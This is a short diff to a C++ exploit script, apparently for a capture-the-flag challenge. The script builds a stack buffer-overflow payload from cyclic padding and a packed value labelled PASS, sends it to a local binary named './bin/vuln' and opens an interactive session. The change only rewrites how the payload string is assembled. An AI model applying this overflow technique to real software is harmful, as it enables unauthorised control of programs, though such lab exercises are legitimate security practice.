@@ -15,10 +15,9 @@ constexpr uint32_t RBP_0x4 = 0x61616178;
 constexpr int PASS         = 7478;
 
 int main() try {
-    auto payload = from_ranges<uint8_t>(
-        cyclic(cyclic_find(RBP_0x4)), 
-        p<uint64_t>(PASS)
-    );
+    std::string payload;
+    payload += cyclic(cyclic_find(RBP_0x4));
+    payload += p<uint64_t>(PASS);
     auto proc = Process("./bin/vuln");
     proc.writeln(payload);
     proc.interactive();
